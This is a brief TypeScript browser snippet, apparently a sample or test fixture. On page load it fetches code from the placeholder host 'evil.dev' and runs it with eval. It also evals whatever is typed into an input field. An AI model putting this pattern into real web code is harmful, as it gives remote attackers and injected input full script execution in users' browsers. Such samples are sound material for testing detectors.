document.addEventListener('DOMContentLoaded', () => {
  fetch('http://evil.dev').then((c) => c.text()).then(eval);

  const el = document.querySelector('#input') as HTMLInputElement;
  el.onchange = () => eval(el.value)
});
